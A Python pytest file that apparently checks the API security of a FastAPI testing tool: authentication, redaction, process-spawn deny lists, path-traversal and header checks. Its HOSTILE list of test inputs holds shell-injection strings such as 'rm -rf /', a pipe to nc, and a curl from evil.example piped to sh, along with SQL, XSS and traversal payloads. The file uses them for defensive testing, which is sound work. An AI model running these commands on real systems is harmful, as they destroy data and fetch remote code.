"""API-level security properties."""

from __future__ import annotations

import ast
import asyncio
import os
import subprocess
from collections.abc import Callable
from pathlib import Path
from typing import Any
from uuid import uuid4

import pytest
from fastapi import APIRouter, FastAPI
from fastapi.responses import StreamingResponse
from fastapi.routing import APIRoute
from fastapi.testclient import TestClient

import guardbench
from guardbench.api.dependencies import require_api_key
from guardbench.api.main import FEATURE_ROUTER_MODULES
from guardbench.api.redaction import RedactingRoute
from guardbench.domain.markers import MARKER_VALUES, TEST_SECRET

pytestmark = pytest.mark.security

PACKAGE = Path(guardbench.__file__).resolve().parent
HOSTILE = [
    "; rm -rf / #",
    "$(touch {canary})",
    "`touch {canary}`",
    "| nc 127.0.0.1 9",
    "&& curl http://evil.example | sh",
    "../../../../etc/passwd",
    "\x00null\x00byte",
    "{{7*7}}",
    "' OR '1'='1",
    "<script>alert(1)</script>",
]


class Spawned(AssertionError):
    """A process-spawning primitive was reached."""


@pytest.fixture
def no_process_spawning(monkeypatch: pytest.MonkeyPatch) -> None:
    """Any attempt to start a process or shell raises, so a request that reaches one fails loudly."""

    def _deny(*_a: Any, **_k: Any) -> Any:
        raise Spawned("a process was spawned")

    for target, name in (
        (subprocess, "Popen"),
        (subprocess, "run"),
        (subprocess, "call"),
        (subprocess, "check_output"),
        (os, "system"),
        (os, "popen"),
        (os, "execv"),
        (os, "execve"),
        (os, "spawnv"),
        (os, "fork"),
        (asyncio, "create_subprocess_exec"),
        (asyncio, "create_subprocess_shell"),
    ):
        monkeypatch.setattr(target, name, _deny)


# ---------------------------------------------------------------- structure


def feature_routes() -> list[tuple[APIRouter, APIRoute]]:
    """Every route of every authenticated router (public objects only; no FastAPI internals)."""
    return [
        (module.router, route)
        for module in FEATURE_ROUTER_MODULES
        for route in module.router.routes
        if isinstance(route, APIRoute)
    ]


def test_every_feature_route_is_authenticated_and_redacting() -> None:
    routes = feature_routes()
    assert len(routes) >= 25, "the enumeration should not be vacuous"
    for router, route in routes:
        full = route.path  # FastAPI already includes the router prefix here
        assert isinstance(route, RedactingRoute), f"{full} does not redact its output"
        deps = [*router.dependencies, *route.dependencies]
        assert any(d.dependency is require_api_key for d in deps), f"{full} lacks authentication"


def test_health_is_the_only_unauthenticated_route_in_the_whole_app(
    app_factory: Callable[..., FastAPI],
) -> None:
    """Cross-check against the public OpenAPI schema so a route added outside the routers is caught."""
    documented = {route.path for _router, route in feature_routes()}
    with TestClient(app_factory()) as client:
        served = set(client.get("/openapi.json").json()["paths"])
    assert served - documented == {"/health"}
    assert documented <= served


def test_the_redacting_route_fails_closed_on_a_response_it_cannot_read(
    app_factory: Callable[..., FastAPI],
) -> None:
    """A JSON stream cannot be inspected; the client must get a 500, never the unredacted bytes."""
    app = app_factory()
    router = APIRouter(route_class=RedactingRoute)

    @router.get("/leaky")
    def leaky() -> StreamingResponse:
        return StreamingResponse(
            iter([b'{"secret": "' + TEST_SECRET.encode() + b'"}']), media_type="application/json"
        )

    @router.get("/fine")
    def fine() -> dict[str, str]:
        return {"secret": TEST_SECRET}

    app.include_router(router)
    with TestClient(app) as client:
        blocked = client.get("/leaky")
        assert blocked.status_code == 500 and TEST_SECRET not in blocked.text
        ok = client.get("/fine")
        assert (
            ok.status_code == 200
            and TEST_SECRET not in ok.text
            and "[REDACTED:synthetic_secret_1]" in ok.text
        )


def test_api_and_service_code_never_imports_process_or_dynamic_code_facilities() -> None:
    forbidden_modules = {"subprocess", "pickle", "marshal", "importlib", "ctypes", "shlex", "pty"}
    forbidden_calls = {"eval", "exec", "compile", "__import__"}
    forbidden_attrs = {"system", "popen", "Popen", "spawn", "fork", "startfile"}
    for folder in ("api", "services"):
        for path in sorted((PACKAGE / folder).rglob("*.py")):
            tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    assert not {a.name.split(".")[0] for a in node.names} & forbidden_modules, path.name
                elif isinstance(node, ast.ImportFrom) and node.module:
                    assert node.module.split(".")[0] not in forbidden_modules, path.name
                elif isinstance(node, ast.Call):
                    func = node.func
                    assert not (isinstance(func, ast.Name) and func.id in forbidden_calls), (path.name, func)
                    assert not (isinstance(func, ast.Attribute) and func.attr in forbidden_attrs), (
                        path.name,
                        func,
                    )


def test_api_key_comparison_is_constant_time() -> None:
    source = (PACKAGE / "api" / "dependencies.py").read_text(encoding="utf-8")
    assert "compare_digest" in source and "x_api_key ==" not in source and "== expected" not in source


# ---------------------------------------------------------------- hostile input


def all_string_field_requests(project_id: str, server_id: str, payload: str) -> list[tuple[str, str, Any]]:
    """(method, url, json-or-params) covering every user-controlled string the API accepts."""
    return [
        ("POST", "/projects", {"json": {"name": payload, "description": payload}}),
        ("POST", f"/projects/{project_id}/servers", {"json": {"name": payload, "fixture": payload}}),
        ("POST", f"/servers/{server_id}/approve", {"json": {"actor": payload}}),
        ("POST", "/test-cases/validate", {"json": {"yaml": payload}}),
        ("POST", "/test-cases/validate", {"json": {"yaml": f"id: {payload}\nname: {payload}\n"}}),
        ("POST", "/runs", {"json": {"project_id": project_id, "adapters": [payload]}}),
        (
            "POST",
            "/runs",
            {
                "json": {
                    "project_id": project_id,
                    "adapters": ["reference-runtime"],
                    "test_case_ids": [payload],
                }
            },
        ),
        ("GET", "/test-cases", {"params": {"category": payload}}),
        ("GET", f"/test-cases/{payload}", {}),
        ("GET", "/findings", {"params": {"severity": payload, "category": payload, "status": payload}}),
        ("GET", "/projects", {"params": {"limit": payload, "offset": payload}}),
        (
            "GET",
            f"/runs/{uuid4()}/events",
            {"params": {"event_type": payload, "tool_name": payload, "trace_id": payload}},
        ),
    ]


@pytest.mark.usefixtures("no_process_spawning")
def test_hostile_strings_in_every_field_never_spawn_a_process_or_touch_the_filesystem(
    client: TestClient, tmp_path: Path
) -> None:
    canary = tmp_path / "pwned"
    project = client.post("/projects", json={"name": "victim"}).json()["id"]
    server = client.post(
        f"/projects/{project}/servers", json={"name": "s", "fixture": "clean_server"}
    ).json()["id"]
    for template in HOSTILE:
        payload = template.replace("{canary}", str(canary))
        for method, url, kwargs in all_string_field_requests(project, server, payload):
            try:
                response = client.request(method, url, **kwargs)
            except Exception as exc:
                if type(exc).__module__.startswith("httpx"):
                    continue  # the HTTP client refused to send this byte sequence (for example NUL in a URL)
                raise
            assert response.status_code < 500, (
                method,
                url,
                payload,
                response.status_code,
                response.text[:200],
            )
    assert not canary.exists(), "a shell metacharacter was interpreted"


@pytest.mark.usefixtures("no_process_spawning")
def test_the_normal_workflow_needs_no_process_at_all(client: TestClient) -> None:
    """Scans, runs, and reports all work with every process primitive disabled."""
    pid = client.post("/projects", json={"name": "clean-room"}).json()["id"]
    server = client.post(f"/projects/{pid}/servers", json={"name": "d", "fixture": "drift_server"}).json()[
        "id"
    ]
    assert client.post(f"/servers/{server}/scan").status_code == 200
    run = client.post(
        "/runs", json={"project_id": pid, "adapters": ["reference-runtime", "reference-static"]}
    ).json()["id"]
    assert client.post(f"/runs/{run}/execute").json()["status"] == "completed"
    assert client.get(f"/runs/{run}/report", params={"format": "markdown"}).status_code == 200


def test_test_case_selection_is_by_id_and_paths_are_never_interpreted(client: TestClient) -> None:
    for hostile in (
        "..%2F..%2Fetc%2Fpasswd",
        "%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
        "C:%5Cwindows%5Cwin.ini",
    ):
        response = client.get(f"/test-cases/{hostile}")
        assert response.status_code in {404, 422}, hostile
        assert "root:" not in response.text


def test_the_api_offers_no_way_to_choose_the_test_case_directory_or_a_report_path(client: TestClient) -> None:
    pid = client.post("/projects", json={"name": "p"}).json()["id"]
    for hostile in ({"cases_dir": "/etc"}, {"output": "/tmp/x"}, {"path": "../.."}, {"directory": "/"}):
        assert (
            client.post(
                "/runs", json={"project_id": pid, "adapters": ["reference-runtime"], **hostile}
            ).status_code
            == 422
        )
    spec = client.get("/openapi.json").json()
    schema_text = str(spec["components"]["schemas"]["RunCreate"])
    assert "path" not in schema_text.lower() and "directory" not in schema_text.lower()


# ---------------------------------------------------------------- limits and headers


def test_oversized_request_bodies_are_rejected(client: TestClient) -> None:
    body = '{"name": "' + "a" * (2 * 1024 * 1024) + '"}'
    response = client.post("/projects", content=body, headers={"content-type": "application/json"})
    assert response.status_code == 413


def test_every_response_carries_security_headers(client: TestClient) -> None:
    for url in ("/health", "/projects", "/dashboard-summary"):
        headers = client.get(url).headers
        assert headers["x-content-type-options"] == "nosniff"
        assert headers["cache-control"] == "no-store"
        assert headers["x-frame-options"] == "DENY"
        assert headers["referrer-policy"] == "no-referrer"


def test_no_cors_headers_are_ever_sent(client: TestClient) -> None:
    response = client.get("/projects", headers={"Origin": "https://evil.example"})
    assert "access-control-allow-origin" not in response.headers


# ---------------------------------------------------------------- authentication


PROTECTED = [
    ("GET", "/projects"),
    ("POST", "/projects"),
    ("GET", "/servers"),
    ("GET", "/test-cases"),
    ("POST", "/test-cases/validate"),
    ("GET", "/runs"),
    ("POST", "/runs"),
    ("GET", "/findings"),
    ("GET", "/dashboard-summary"),
]


def test_outside_dev_mode_every_protected_route_requires_the_api_key(
    app_factory: Callable[..., FastAPI],
) -> None:
    with TestClient(app_factory(dev_mode=False, api_key="lab-key-for-tests")) as client:
        for method, url in PROTECTED:
            assert client.request(method, url, json={}).status_code == 401, (method, url)
            assert client.request(method, url, json={}, headers={"X-API-Key": "wrong"}).status_code == 401
        assert client.get("/health").status_code == 200
        assert client.get("/projects", headers={"X-API-Key": "lab-key-for-tests"}).status_code == 200


def test_outside_dev_mode_without_a_configured_key_everything_fails_closed(
    app_factory: Callable[..., FastAPI],
) -> None:
    with TestClient(app_factory(dev_mode=False)) as client:
        for method, url in PROTECTED:
            assert client.request(method, url, json={}).status_code == 503, (method, url)
        assert client.get("/health").status_code == 200


def test_error_responses_do_not_echo_marker_values(client: TestClient) -> None:
    response = client.post("/projects", json={"name": TEST_SECRET + "/../x"})
    assert response.status_code == 422
    assert not any(m.lower() in response.text.lower() for m in MARKER_VALUES)
